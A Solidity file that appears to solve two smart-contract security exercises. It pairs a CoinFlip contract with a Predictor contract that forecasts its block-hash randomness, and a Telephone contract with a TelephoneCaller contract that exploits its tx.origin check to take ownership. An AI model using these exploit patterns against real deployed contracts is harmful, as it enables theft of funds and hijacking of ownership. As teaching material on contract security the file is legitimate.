// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
interface CoinI {
    function flip(bool _guess) external returns (bool);
}
contract Predictor {
        constructor(address  _contractAddress) {
    _coinI = CoinI(_contractAddress);
    }
CoinI public _coinI;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    function oracle() public returns (bool side) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;
        _coinI.flip(side);
}
}
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
interface TelephoneI {
    function changeOwner(address _owner) external ;
}
contract TelephoneCaller {
    TelephoneI public _telephoneI;
            constructor(address  _contractAddress) {
    _telephoneI = TelephoneI(_contractAddress);
    }
    function call(address _newOwner)public  {
_telephoneI.changeOwner(_newOwner);
    }
}